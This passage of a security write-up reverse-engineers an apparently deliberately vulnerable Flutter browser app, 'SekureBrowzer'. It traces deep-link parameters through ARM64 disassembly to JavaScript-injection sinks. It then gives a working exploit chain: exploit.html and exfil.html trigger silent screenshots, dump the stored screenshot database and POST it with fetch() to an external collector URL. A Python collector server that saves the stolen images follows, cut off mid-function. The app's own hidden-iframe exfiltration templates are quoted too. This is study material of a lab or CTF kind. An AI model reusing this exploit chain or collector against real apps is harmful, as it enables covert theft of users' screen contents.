[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
>> resolveIndex(classId=94, selector=0): {'target': '0x103ac0358', 'fileOffset': '0x258358', 'inModule': True}
DONE
```

A second selector, `0` (`String.==`), was cross-checked the same way against `classId=94` (`OneByteString`) and resolved to file offset `0x258358` — the exact address a completely separate Frida hook (directly on the string-equality routine itself, described below). So two different methods landing on the same address is strong evidence the whole pipeline — `X21` capture, index math, `dump.dart` lookup — is correct end to end.

Resolving a raw target address back to a name is one line of arithmetic plus a `dump.dart` lookup: `dump.dart offset = (live_target_address - App_module_base) - 0xE8C0`

That resolution pipeline (`resolve_dispatch_table.py`) can be sanity-checked with no device at all, against addresses already confirmed elsewhere:

```bash
>>> resolve(by_offset, '0x19f83c')
_BrowserScreenState._processDataCommand (package:sekure_browzer/main.dart)
>>> resolve(by_offset, '0x258358')
String.== (dart:core)
```

Both correct, which validates the parser and the offset math before trusting it against live data.

### Prologue + stack-overflow guard (not param-related)

```asm
0x19eec8  STP  X29, X30, [X15,#-0x10]!   
0x19eecc  MOV  X29, X15                  
0x19eed0  SUB  X15, X15, #0x70           ; SP -= 0x70, reserve locals
0x19eed4  MOV  X0, X1
0x19eed8  STUR X1, [X29,#-8]             ; spill arg1 (self, BrowserScreenState) -> -8
0x19eedc  MOV  X1, X2
0x19eee0  STUR X2, [X29,#-0x10]          ; spill arg2 (Uri = the deep-link target) -> -0x10
0x19eee4  LDR  X16, [X26,#0x38]          ; X26 = ThreadState*; load stack-limit
0x19eee8  CMP  X15, X16
0x19eeec  B.LS loc_19F810                ; if SP past limit -> grow-stack stub, then retry from 0x19eef0
```

### Log line #1 build + print — "Deep link received: <uri>" (not param-related, plumbing only)

```asm
0x19eef0  MOV  X1, #3
0x19eef4  BL   sub_2BF3B0                ; allocate interpolation buffer #1
0x19eef8  MOV  X3, X0
0x19eefc  LDUR X0, [X29,#-8]
0x19ef00  STUR X3, [X29,#-0x18]
0x19ef04  STUR X0, [X3,#0x17]
0x19ef08  MOV  X1, X22                   ; X22 = cached Dart `null` sentinel (reused throughout as the null-check comparand)
0x19ef0c  MOV  X2, #4
0x19ef10  BL   sub_2C0498                ; allocate interpolation buffer #2
0x19ef14  MOV  X1, X0
0x19ef18  STUR X1, [X29,#-0x20]
0x19ef1c  ADD  X16, X27, #0xF,LSL#12
0x19ef20  LDR  X16, [X16,#0xBD8]         ; POOLFULL[X27+0xFBD8] = "Deep link received: "
0x19ef24  STUR X16, [X1,#0x17]
0x19ef28  LDUR X2, [X29,#-0x10]          ; reload uri
0x19ef2c  LDUR X0, [X2,#-1]
0x19ef30  UBFX X0, X0, #0xC, #0x14
0x19ef34  STR  X2, [X15]
0x19ef38  LDR  X4, [X27,#0x3B0]
0x19ef3c  MOV  X17, #0x1AD3
0x19ef40  ADD  X30, X0, X17
0x19ef44  LDR  X30, [X21,X30,LSL#3]      ; Uri.toString() dispatch (X0's own class-id path, no fixed selector table row above)
0x19ef48  BLR  X30                       ; CALL uri.toString()
0x19ef4c  LDUR X1, [X29,#-0x20]
0x19ef50  ADD  X25, X1, #0x1F
0x19ef54  STR  X0, [X25]
0x19ef58  TBZ  W0, #0, loc_19EF74        
0x19ef5c  LDURB W16, [X1,#-1]
0x19ef60  LDURB W17, [X0,#-1]
0x19ef64  AND  X16, X17, X16,LSR#2
0x19ef68  TST  X16, X28,LSR#32
0x19ef6c  B.EQ loc_19EF74
0x19ef70  BL   sub_2BE720                
0x19ef74  LDUR X16, [X29,#-0x20]
0x19ef78  STR  X16, [X15]
0x19ef7c  BL   _StringBase___interpolate_11494   ; build "Deep link received: <uri>"
0x19ef80  MOV  X1, X0
0x19ef84  BL   ____print_37ba8           ; print() the line
```

### `Uri.scheme` guard — gate on the `sekurebrowzer://` scheme itself

```asm
0x19ef88  LDUR X2, [X29,#-0x10]          ; X2 = uri
0x19ef8c  LDUR X0, [X2,#-1]              ; uri's header word
0x19ef90  UBFX X0, X0, #0xC, #0x14       ; uri's class id
0x19ef94  MOV  X1, X2                    ; X1 = receiver = uri
0x19ef98  SUB  X30, X0, #0xFF4           ; selector 0xFF4 = Uri.scheme getter
0x19ef9c  LDR  X30, [X21,X30,LSL#3]
0x19efa0  BLR  X30                       ; CALL uri.scheme  -> X0 = scheme string
0x19efa4  LDUR X1, [X0,#-1]              ; scheme string's header word
0x19efa8  UBFX X1, X1, #0xC, #0x14       ; scheme string's class id
0x19efac  ADD  X16, X27, #0xC,LSL#12
0x19efb0  LDR  X16, [X16,#0x238]         ; POOLFULL[X27+0xC238] = "sekurebrowzer"
0x19efb4  STP  X16, X0, [X15]            ; equality-call arg array: [X15]="sekurebrowzer", [X15+8]=scheme
0x19efb8  MOV  X0, X1                    ; X0 = scheme's class id (index directly, selector 0)
0x19efbc  MOV  X30, X0
0x19efc0  LDR  X30, [X21,X30,LSL#3]      ; selector 0 = String.operator== 
0x19efc4  BLR  X30                       ; CALL scheme == "sekurebrowzer"
0x19efc8  TBNZ W0, #4, loc_19F800        ; if NOT equal -> jump straight to `return` at 0x19f800.
                                       ; every query-param extraction below only runs for
                                       ; sekurebrowzer://... links; sekureexec:// is NOT this gate
                                       ; and is not handled anywhere in this function
```

### The query parameters, and how the function actually reads them

Each block: `uri.queryParameters` getter (selector `0xFF0`) → `Map.[]("<key>")` (selector `0x1000`) → spill result to its stack slot. `X2` is reloaded with the `uri` object (from `-0x10`) at the start of every block since the previous block's `Map.[]` call clobbered it.

**`"url"` → slot `-0x20`:**
```asm
0x19efcc  LDUR X3, [X29,#-8]
0x19efd0  LDUR X2, [X29,#-0x10]          ; X2 = uri (receiver for .queryParameters)
0x19efd4  LDUR X4, [X29,#-0x18]
0x19efd8  LDUR X0, [X2,#-1]
0x19efdc  UBFX X0, X0, #0xC, #0x14       ; uri's class id
0x19efe0  MOV  X1, X2
0x19efe4  SUB  X30, X0, #0xFF0           ; selector 0xFF0 = Uri.queryParameters
0x19efe8  LDR  X30, [X21,X30,LSL#3]
0x19efec  BLR  X30                       ; CALL uri.queryParameters  -> X0 = Map<String,String>
0x19eff0  LDUR X1, [X0,#-1]              ; map's header word
0x19eff4  UBFX X1, X1, #0xC, #0x14       ; map's class id
0x19eff8  MOV  X16, X0                   ; save map ref
0x19effc  MOV  X0, X1                    ; X0 = map's class id
0x19f000  MOV  X1, X16                   ; X1 = receiver = the map
0x19f004  ADD  X2, X27, #0xD,LSL#12
0x19f008  LDR  X2, [X2,#0x488]           ; POOLFULL[X27+0xD488] = "url"  <- the lookup KEY, arg to Map.[]
0x19f00c  SUB  X30, X0, #1,LSL#12        ; selector 0x1000 = Map.operator[]
0x19f010  LDR  X30, [X21,X30,LSL#3]
0x19f014  BLR  X30                       ; CALL queryParameters["url"]  -> X0 = url value (String? or null)
0x19f018  MOV  X3, X0
0x19f01c  LDUR X2, [X29,#-0x10]          ; reload uri for the next extraction
0x19f020  STUR X3, [X29,#-0x20]          ; spill url value -> slot -0x20
```

**`"takeScreenshot"` → slot `-0x28`:**
```asm
0x19f024  LDUR X0, [X2,#-1]
0x19f028  UBFX X0, X0, #0xC, #0x14
0x19f02c  MOV  X1, X2
0x19f030  SUB  X30, X0, #0xFF0           ; Uri.queryParameters
0x19f034  LDR  X30, [X21,X30,LSL#3]
0x19f038  BLR  X30                       ; -> Map
0x19f03c  LDUR X1, [X0,#-1]
0x19f040  UBFX X1, X1, #0xC, #0x14
0x19f044  MOV  X16, X0
0x19f048  MOV  X0, X1
0x19f04c  MOV  X1, X16
0x19f050  ADD  X2, X27, #0xF,LSL#12
0x19f054  LDR  X2, [X2,#0x400]           ; POOLFULL[X27+0xF400] = "takeScreenshot"  <- lookup key
0x19f058  SUB  X30, X0, #1,LSL#12        ; Map.operator[]
0x19f05c  LDR  X30, [X21,X30,LSL#3]
0x19f060  BLR  X30                       ; -> takeScreenshot value
0x19f064  MOV  X3, X0
0x19f068  LDUR X2, [X29,#-0x10]
0x19f06c  STUR X3, [X29,#-0x28]          ; spill -> slot -0x28
```

**`"execute"` → slot `-0x30`:**
```asm
0x19f070  LDUR X0, [X2,#-1]
0x19f074  UBFX X0, X0, #0xC, #0x14
0x19f078  MOV  X1, X2
0x19f07c  SUB  X30, X0, #0xFF0
0x19f080  LDR  X30, [X21,X30,LSL#3]
0x19f084  BLR  X30                       ; -> Map
0x19f088  LDUR X1, [X0,#-1]
0x19f08c  UBFX X1, X1, #0xC, #0x14
0x19f090  MOV  X16, X0
0x19f094  MOV  X0, X1
0x19f098  MOV  X1, X16
0x19f09c  ADD  X2, X27, #0xD,LSL#12
0x19f0a0  LDR  X2, [X2,#0x200]           ; POOLFULL[X27+0xD200] = "execute"  <- lookup key
0x19f0a4  SUB  X30, X0, #1,LSL#12
0x19f0a8  LDR  X30, [X21,X30,LSL#3]
0x19f0ac  BLR  X30                       ; -> execute value (raw JS to run)
0x19f0b0  MOV  X3, X0
0x19f0b4  LDUR X2, [X29,#-0x18]
0x19f0b8  STUR X3, [X29,#-0x30]          ; spill -> slot -0x30
0x19f0bc  STUR X0, [X2,#0x1F]            ; also stash into log-builder #1 for the "Execute JS parameter:" line
0x19f0c0  TBZ  W0, #0, loc_19F0DC
0x19f0c4  LDURB W16, [X2,#-1]
0x19f0c8  LDURB W17, [X0,#-1]
0x19f0cc  AND  X16, X17, X16,LSR#2
0x19f0d0  TST  X16, X28,LSR#32
0x19f0d4  B.EQ loc_19F0DC
0x19f0d8  BL   sub_2BEB84                
```

**`"dbCommand"` → slot `-0x38`:**
```asm
0x19f0dc  LDUR X4, [X29,#-0x10]
0x19f0e0  LDUR X0, [X4,#-1]
0x19f0e4  UBFX X0, X0, #0xC, #0x14
0x19f0e8  MOV  X1, X4
0x19f0ec  SUB  X30, X0, #0xFF0
0x19f0f0  LDR  X30, [X21,X30,LSL#3]
0x19f0f4  BLR  X30                       ; -> Map
0x19f0f8  LDUR X1, [X0,#-1]
0x19f0fc  UBFX X1, X1, #0xC, #0x14
0x19f100  MOV  X16, X0
0x19f104  MOV  X0, X1
0x19f108  MOV  X1, X16
0x19f10c  ADD  X2, X27, #0xF,LSL#12
0x19f110  LDR  X2, [X2,#0xBE0]           ; POOLFULL[X27+0xFBE0] = "dbCommand"  <- lookup key, THE export gate
0x19f114  SUB  X30, X0, #1,LSL#12
0x19f118  LDR  X30, [X21,X30,LSL#3]
0x19f11c  BLR  X30                       ; -> dbCommand value (null unless present)
0x19f120  MOV  X3, X0
0x19f124  LDUR X2, [X29,#-0x10]
0x19f128  STUR X3, [X29,#-0x38]          ; spill -> slot -0x38 (checked at 0x19f4bc, see below)
```

**`"dbId"` → slot `-0x40`:**
```asm
0x19f12c  LDUR X0, [X2,#-1]
0x19f130  UBFX X0, X0, #0xC, #0x14
0x19f134  MOV  X1, X2
0x19f138  SUB  X30, X0, #0xFF0
0x19f13c  LDR  X30, [X21,X30,LSL#3]
0x19f140  BLR  X30                       ; -> Map
0x19f144  LDUR X1, [X0,#-1]
0x19f148  UBFX X1, X1, #0xC, #0x14
0x19f14c  MOV  X16, X0
0x19f150  MOV  X0, X1
0x19f154  MOV  X1, X16
0x19f158  ADD  X2, X27, #0xF,LSL#12
0x19f15c  LDR  X2, [X2,#0xBE8]           ; POOLFULL[X27+0xFBE8] = "dbId"  <- lookup key
0x19f160  SUB  X30, X0, #1,LSL#12
0x19f164  LDR  X30, [X21,X30,LSL#3]
0x19f168  BLR  X30                       ; -> dbId value
0x19f16c  MOV  X3, X0
0x19f170  LDUR X2, [X29,#-0x10]
0x19f174  STUR X3, [X29,#-0x40]          ; spill -> slot -0x40 (never compared locally — forwarded
                                        ; verbatim to _processDataCommand at 0x19f4c8)
```

**`"openGallery"` → slot `-0x48`:**
```asm
0x19f178  LDUR X0, [X2,#-1]
0x19f17c  UBFX X0, X0, #0xC, #0x14
0x19f180  MOV  X1, X2
0x19f184  SUB  X30, X0, #0xFF0
0x19f188  LDR  X30, [X21,X30,LSL#3]
0x19f18c  BLR  X30                       ; -> Map
0x19f190  LDUR X1, [X0,#-1]
0x19f194  UBFX X1, X1, #0xC, #0x14
0x19f198  MOV  X16, X0
0x19f19c  MOV  X0, X1
0x19f1a0  MOV  X1, X16
0x19f1a4  ADD  X2, X27, #0xF,LSL#12
0x19f1a8  LDR  X2, [X2,#0xBF0]           ; POOLFULL[X27+0xFBF0] = "openGallery"  <- lookup key,
                                       ; THE top-priority gate (checked first of all, at 0x19f468)
0x19f1ac  SUB  X30, X0, #1,LSL#12
0x19f1b0  LDR  X30, [X21,X30,LSL#3]
0x19f1b4  BLR  X30                       ; -> openGallery value
0x19f1b8  MOV  X3, X0
0x19f1bc  LDUR X2, [X29,#-0x10]
0x19f1c0  STUR X3, [X29,#-0x48]          ; spill -> slot -0x48
```

**`"attackerUrl"` → slot `-0x50`:**
```asm
0x19f1c4  LDUR X0, [X2,#-1]
0x19f1c8  UBFX X0, X0, #0xC, #0x14
0x19f1cc  MOV  X1, X2
0x19f1d0  SUB  X30, X0, #0xFF0
0x19f1d4  LDR  X30, [X21,X30,LSL#3]
0x19f1d8  BLR  X30                       ; -> Map
0x19f1dc  LDUR X1, [X0,#-1]
0x19f1e0  UBFX X1, X1, #0xC, #0x14
0x19f1e4  MOV  X16, X0
0x19f1e8  MOV  X0, X1
0x19f1ec  MOV  X1, X16
0x19f1f0  ADD  X2, X27, #0xF,LSL#12
0x19f1f4  LDR  X2, [X2,#0xBF8]           ; POOLFULL[X27+0xFBF8] = "attackerUrl"  <- lookup key
0x19f1f8  SUB  X30, X0, #1,LSL#12
0x19f1fc  LDR  X30, [X21,X30,LSL#3]
0x19f200  BLR  X30                       ; -> attackerUrl value (exfil destination, consumed inside
                                       ; _processDataCommand, not compared here)
0x19f204  MOV  X1, X22
0x19f208  MOV  X2, #4
0x19f20c  STUR X0, [X29,#-0x50]          ; spill -> slot -0x50
```

### Actual control flow (in execution order)

```
scheme guard: if uri.scheme != "sekurebrowzer" → return (0x19f800)
log "Deep link received: <uri>"
extract all params from uri.queryParameters
log "Target URL parameter: <url>"
log "Take Screenshot parameter: <takeScreenshot>"
log "Execute JS parameter: <execute>"
log "Database Command: <dbCommand>"
log "Open Gallery: <openGallery>"
log "Path segments: <uri.pathSegments>"   (uri metadata, unrelated to the 7 params)
duplicate-uri / null-state guard (internal, not param-driven)
SnackBar "Processing deep link: <uri>"

── PRIORITY 1: if openGallery == "true":
    show a SnackBar, Future.delayed(...) [gallery nav trigger], RETURN — 0x19f4b4
              (dbCommand/url/takeScreenshot/execute never even get to run if this fires)

── PRIORITY 2: if dbCommand != null:
    BL _processDataCommand(self, dbCommand, dbId, attackerUrl, ...), RETURN — 0x19f4e0
              (this is the bulk-screenshot-export / exfil pipeline)

── PRIORITY 3 (only if no openGallery, no dbCommand): url handling
    if url present and non-empty:
        normalize scheme (add "https://" if missing a scheme)
        Uri.parse(normalized) → WebViewController.loadRequest(...)
              else (url absent/empty):
                 hardcoded fallback: Uri.parse("https://yahoo.com") → loadRequest(...)

── if takeScreenshot == "true":
    SnackBar "Screenshot..." + Future.delayed(...) [screenshot trigger]
              (falls through, does NOT return — execute is still checked next)

── if execute != null:
    SnackBar "Executing JavaScript: <execute>" + Future.delayed(...)
              [JS-injection trigger — presumably runJavaScript(execute) inside
              the delayed callback]

0x19f800  return
```

Tracing the actual control flow surfaces two behaviors a quick read misses: `openGallery` outranks everything, including `dbCommand` — if both are present on the same link, `openGallery` wins and the function returns before `dbCommand` is even inspected. And `url` has a hardcoded fallback (`https://yahoo.com`) when it's absent, so even a param-less link still forces a navigation — though that only matters when `dbCommand` isn't also present, since `dbCommand` short-circuits before reaching the `url` handling at all.

Putting it together, this is the shape of the scheme: 
```bash
sekurebrowzer://<any-host>?url=<page>&takeScreenshot=true&dbCommand=<cmd>&dbId=<id>&attackerUrl=<url>
```

And the validation on all of it: one comparison, `Uri.scheme == "sekurebrowzer"`. The host segment is read by nothing in this function and gates nothing — any host string works identically. None of the query values are checked against an allow-list, a token, or a signature anywhere.

## Locating the next call — `_processDataCommand`

`_handleDeepLink` only calls `_processDataCommand` when `dbCommand` is present, which makes it the function to decompile next.

### Argument layout

The function's prologue saves five incoming registers to the stack frame:

```asm
0x19f848   STUR X22, [X29,#-8]        ; X22 = Dart's boxed-null sentinel for this call
0x19f84c   STUR X1,  [X29,#-0xA0]     ; arg1 -> this (_BrowserScreenState)
0x19f85c   STUR X2,  [X29,#-0xA8]     ; arg2 -> dbCommand
0x19f860   STUR X1,  [X29,#-0xB0]     ; arg3 -> dbId
0x19f864   STUR X5,  [X29,#-0xB8]     ; arg5 -> attackerUrl
```

`dbCommand` at `[X29,-0xA8]`, `dbId` at `[X29,-0xB0]`, `attackerUrl` at `[X29,-0xB8]`. This is confirmed by every downstream use: all three `String.==` comparisons load their left-hand operand from `-0xA8`, the `"get"` branch's null check reads `-0xB0`, and the `"exfiltrate"` branch's null check reads `-0xB8`.

### The dispatch: three gated comparisons, then a real no-op default

```C
if (dbCommand == "getAll") {
    exportedJson = StorageManager.getAllScreenshotsAsJson()
    runJavaScript(<template: writes JSON into a hidden #stolen-data div, ends with alert()>)
    showSnackBar("Retrieved all screenshots (N bytes)")
}
else if (dbCommand == "get") {
    if (dbId == null) return;                              // silent no-op
    id = int.parse(dbId)
    base64Img = StorageManager.getScreenshotAsBase64(id)
    runJavaScript(<template: paints a visible "Stolen Screenshot" box>)
    showSnackBar("Retrieved screenshot ID <id> with <n> bytes")
}
else if (dbCommand == "exfiltrate") {
    exportedJson = StorageManager.getAllScreenshotsAsJson()
    postUrl = (attackerUrl != null) ? attackerUrl : "https://example.com/exfiltrate"
    runJavaScript(<template: hidden iframe + auto-submit form POST to postUrl>)
    showSnackBar("Sending screenshots to external server: <postUrl>")
}
else {
    print("Unknown database command: " + dbCommand)        // no export, no runJavaScript, no SnackBar
}
```

### The sinks

All three recognized branches end the same way: export the screenshot store, wrap the result in a JS template, and hand it to `WebViewController.runJavaScript()` — the sink. The templates themselves show exactly what lands on the victim's screen, quoted below.

`getAll`'s template writes into the currently-loaded page's DOM:

```js
let dataDiv = document.getElementById('stolen-data');
if (!dataDiv) {
  dataDiv = document.createElement('div');
  dataDiv.id = 'stolen-data';
  dataDiv.style.display = 'none';
  document.body.appendChild(dataDiv);
}
dataDiv.textContent = JSON.stringify(data);
alert('Successfully retrieved ' + data.length + ' screenshots from database');
```

`get`'s template (single screenshot) does something more visible — it paints a real UI element, not just a hidden div:

```js
const img = document.createElement('img');
img.src = 'data:image/png;base64,' + imgData;
const container = document.createElement('div');
container.style.position = 'fixed';
container.style.top = '10px';
container.style.right = '10px';
container.style.zIndex = '9999';
// ... white background, red border, drop shadow, title "Stolen Screenshot (ID: N)"
```

`exfiltrate`'s template is the one that doesn't need any cooperation from the loaded page at all — it builds and submits its own POST:

```js
localStorage.setItem('stored_screenshots', rawData);
alert('Successfully stored ' + data.length + ' screenshots. Sending to <postUrl>');
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
const form = document.createElement('form');
form.method = 'POST';
form.action = '<postUrl>';
// ... appended into the iframe and submitted
```

### A second, independent sink: `sekureexec://anyhost?js=`

Everything above explains `sekurebrowzer://` and its `dbCommand`/`execute` parameters. It does not, though, explain `sekureexec://anyhost?js=<payload>` — that scheme is never compared against anywhere inside `_handleDeepLink`, which checks `Uri.scheme == "sekurebrowzer"` exactly once and returns for anything else.

Finding where `sekureexec://` is actually handled means cross-referencing every call site of `WebViewController.runJavaScript` across the whole binary, not just the one function already under investigation. That turns up three call sites inside `_processDataCommand` (above) plus three more inside anonymous Dart closures the tree-shaker kept alive. One of those closures is the WebView's own `NavigationDelegate` callback — it runs on every navigation attempt inside the app, not just external deep links:

```asm
; does the navigation URL start with "sekureexec://" ?
0x1abf08   LDR   X2, [pool 0x10128]        ; "sekureexec://"
0x1abf14   BL    _StringBase__startsWith
0x1abf18   TBNZ  W0, #4, loc_1ABFB0        ; not it -> check "sekurebrowzer://" instead

; yes: pull the "js" query parameter straight out and run it
0x1abf24   BL    Uri__parse
0x1abf44   BLR   X30                       ; Uri.queryParameters getter
0x1abf60   LDR   X2, [pool 0xDC50]         ; "js"
0x1abf6c   BLR   X30                       ; Map["js"]
0x1abf98   BL    WebViewController__runJavaScript  ; SINK — no decode, no length check, no allow-list

; not sekureexec:// either — does it start with "sekurebrowzer://"?
0x1abfd8   BL    Uri__parse
0x1abff4   BL    _BrowserScreenState___handleDeepLink   ; recurses straight back into the same dispatcher
```

This closure does two separate jobs. It implements `sekureexec://anyhost?js=<payload>` as its own sink — the scheme check, the parameter extraction, and the `runJavaScript` call are all here, not in `_handleDeepLink` — with the value handed to `runJavaScript` coming straight off `Uri.parse(url).queryParameters["js"]`, no decoding and no restriction. It also re-enters `_handleDeepLink` for any in-page `sekurebrowzer://` navigation — a clicked link, `window.location =`, a redirecting meta tag, a form action — that isn't `http(s)://`. Once an attacker's page is loaded into the WebView by any means, including the very first `url=` navigation from the initial deep link, it can drive the rest of the chain with an in-page redirect instead of a second OS-level scheme launch — one fewer place for the one-time "Open in SekureBrowzer?" prompt to reappear.

## From source to sink

A few separate root causes chain into one exploit:

- **RC1 — no authentication on the custom URL scheme.** Zero native-layer check (stock `FlutterAppDelegate`), zero Dart-layer check beyond `Uri.scheme == "sekurebrowzer"`. Any page, in any browser, can drive the app.
- **RC2 — silent screenshot capture, no consent.** `takeScreenshot=true` reaches `_silentScreenshot()`, which captures the screen with no prompt and no visible indicator. This is the one step in the chain that's fully silent end to end.
- **RC3 — arbitrary JS execution against the live page, two separate sinks.** on `sekurebrowzer://` and `js=` on `sekureexec://anyhost` both reach `WebViewController.runJavaScript()` with essentially no restriction.
- **RC4 — unencrypted, bulk-exportable screenshot history.** Every screenshot, manual or silent, lands in a plaintext SQLite `screenshots.db`. `getAllScreenshotsAsJson()` is live, reachable code, wired directly into `_processDataCommand`.

Chained together, the strongest one-shot variant uses `dbCommand=exfiltrate` — it doesn't need any script on the landing page at all, because the app builds and submits the exfiltration POST itself:

```
attacker page load
    │
    ▼
sekurebrowzer://anyhost?url=<attacker_url>&takeScreenshot=true&dbCommand=exfiltrate&attackerUrl=<collector_url>
    │
    ├── navigate WebView to <attacker_url>                                     (RC1)
    ├── silently capture current page, no prompt                               (RC2)
    └── "exfiltrate" branch in _processDataCommand:
            StorageManager.getAllScreenshotsAsJson()
                ──▶ runJavaScript(<hidden iframe + auto-POST form>)            (RC3 + RC4)
                        │
                        ▼
        app-built form POSTs every stored screenshot, as JSON, to
        <collector_url> — no landing-page script required
```

The weaker variant, `dbCommand=getAll` with no `attackerUrl`, still works but needs the landing page to do the last step itself — it writes the JSON into `#stolen-data` on whatever page is loaded, and something on that page has to read it back out and ship it

## Building the PoC

The one-shot `dbCommand=exfiltrate` variant looked the cleanest on paper — the app itself builds and submits a hidden-iframe form to an attacker-controlled URL, needing no script on the landing page at all. But in testing, the app-built POST didn't reliably reach the collector server, despite the SnackBar confirming the attempt. It may be a timing issue (the iframe form executing before the page has a clean network path), or a WebView configuration that actually does reject certain cross-origin POSTs. Rather than spend more time on it, the PoC will go with the `dbCommand=getAll` variant, which requires the attacker's landing page to read the stolen data back out of the DOM and ship it itself, but proved reliable in testing.

The exploit is two attacker-controlled pages running under the same domain. The entry point is `exploit.html`:

```
User opens: https://attacker.com/exploit.html in SekureBrowzer
      ↓
JavaScript sets window.location = "sekurebrowzer://anyhost?url=https://attacker.com/exfil.html&takeScreenshot=true"
      ↓
App: silently screenshots the exploit page (RC2)
App: navigates WebView to exfil.html (RC1)
```

Once the WebView lands on `exfil.html`, that page immediately fires a second deep link on page load:

```js
window.location = "sekurebrowzer://anyhost?dbCommand=getAll"
```

The `getAll` branch in `_processDataCommand` then exports every stored screenshot as JSON, wraps it in JavaScript code that writes the JSON into a hidden `<div id="stolen-data">`, and injects that into the page via `WebViewController.runJavaScript()` (RC3). The page-side script, meanwhile, polls or observes that div (e.g., via `MutationObserver`) until it populates with the JSON, then POSTs the stolen data to a local collector server:

```html
<!-- exploit.html -->
 <!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Loading...</title></head>
<body>
<p>Redirecting to screenshot page...</p>

<script>
// Trigger deep link: navigate to exfil.html AND take silent screenshot
// App will load exfil.html, capture screenshot, then exfil.html runs getAll+POST
window.location = "sekurebrowzer://anyhost?url=https://attacker.com/exfil.html&takeScreenshot=true";
</script>

</body>
</html>
```

```html
<!-- exfil.html -->
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Processing...</title></head>
<body>
<h3>Exfiltrating Stored Screenshots</h3>
<p id="status" style="color:#666; font-size:12px;"></p>
<pre id="stolen-data" style="white-space:pre-wrap;word-break:break-all;border:1px solid #ccc;padding:10px;display:none;"></pre>

<script>
const STATUS = document.getElementById('status');
const STOLEN = document.getElementById('stolen-data');
const COLLECTOR = 'https://archive-oriented-imagine-warner.trycloudflare.com/collect';

function log(msg) {
  const ts = new Date().toISOString().split('T')[1].split('.')[0];
  STATUS.textContent = `[${ts}] ${msg}`;
  console.log(msg);
}

function triggerDeepLink(url) {
  const link = document.createElement('a');
  link.href = url;
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function runExfil() {
  setTimeout(() => {
    log('Step 1: Triggering getAll (retrieve all screenshots)...');
    triggerDeepLink("sekurebrowzer://anyhost?dbCommand=getAll");

    setTimeout(() => {
      log('Step 2: Reading DOM and posting to collector...');
      const data = STOLEN.textContent;
      if (!data || data.length === 0) {
        log('ERROR: No data in #stolen-data div. getAll may have failed.');
        return;
      }

      log('Step 3: Sending POST (staying on page)...');

      // Use fetch() with URL-encoded form data
      const params = new URLSearchParams();
      params.append('dump', data);

      fetch(COLLECTOR, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params.toString()
      })
      .then(response => {
        log('✓ Data exfiltrated successfully. Response: ' + response.status);
        return response.text();
      })
      .catch(error => {
        log('✗ Exfil failed: ' + error);
      });
    }, 3000);
    
  }, 3000);
}

// Auto-run exfil when page loads
log('Page loaded. Screenshot captured. Starting exfil chain...');
runExfil();
</script>

</body>
</html>
```

The collector is a simple local Python server listening on `http://localhost:8000/collect`. It receives each POSTed dump (URL-encoded JSON), decodes it into a list of screenshot records, then base64-decodes each record's `image_data` field. A quick sniff of the magic bytes (PNG header is `89 50 4e 47`, JPEG is `ff d8 ff e0`) determines the file type, and the raw bytes are written to disk as a real image file:

```python
#!/usr/bin/env python3
import base64
import http.server
import json
import mimetypes
import os
import sys
import time
import urllib.parse

CAPTURE_DIR = os.path.join(os.path.dirname(__file__), "captured")
STATIC_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_FILE = "exploit.html"

class Handler(http.server.BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        req_path = urllib.parse.urlsplit(self.path).path
        rel_path = req_path.lstrip("/") or DEFAULT_FILE
        file_path = os.path.normpath(os.path.join(STATIC_DIR, rel_path))

        if os.path.commonpath([file_path, STATIC_DIR]) != STATIC_DIR or not os.path.isfile(file_path):
            self.send_response(404)
            self._cors()
            self.end_headers()
            self.wfile.write(b"not found")
            return

        ctype = mimetypes.guess_type(file_path)[0] or "application/octet-stream"
        with open(file_path, "rb") as f:
            body = f.read()

        print(f"[+] {self.client_address[0]} -> GET {self.path}  served={rel_path}  bytes={len(body)}")

        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self._cors()
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b""
        ts = time.strftime("%Y%m%dT%H%M%S")
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        json_path = os.path.join(CAPTURE_DIR, f"{ts}_{id(self)}.json")
        with open(json_path, "wb") as f:
            f.write(raw)

        img_count = 0
        try:
            # Parse form data (dump=JSON_ARRAY)
            form_data = urllib.parse.parse_qs(raw.decode("utf-8", "replace"))
            dump_value = form_data.get("dump", [None])[0]

            if not dump_value:
                raise ValueError("No 'dump' field in POST data")

            # Parse JSON array
            screenshots = json.loads(dump_value)

            # Extract and save images
            if isinstance(screenshots, list):
                for idx, record in enumerate(screenshots):
                    if isinstance(record, dict) and "image_data" in record:
                        try:
                            img_b64 = record["image_data"]
                            img_bytes = base64.b64decode(img_b64)

                            # Determine format from magic bytes
                            if img_bytes[:4] == b'\x89PNG':
                                ext = 'png'
                            elif img_bytes[:4] == b'\xff\xd8\xff\xe0' or img_bytes[:4] == b'\xff\xd8\xff\xe1':
                                ext = 'jpg'
                            else:
                                ext = 'bin'

                            # Use filename from record if available
                            filename = record.get("filename", f"screenshot_{idx:04d}.{ext}")
                            if not filename.endswith(f'.{ext}'):
                                base_name = filename.rsplit('.', 1)[0]
                                filename = f"{base_name}.{ext}"

                            img_path = os.path.join(CAPTURE_DIR, filename)
                            with open(img_path, "wb") as f:
                                f.write(img_bytes)
                            img_count += 1
                        except Exception as e:
                            pass

            print(f"[+] {self.client_address[0]} -> {self.path}")
            print(f"    JSON: {json_path}")
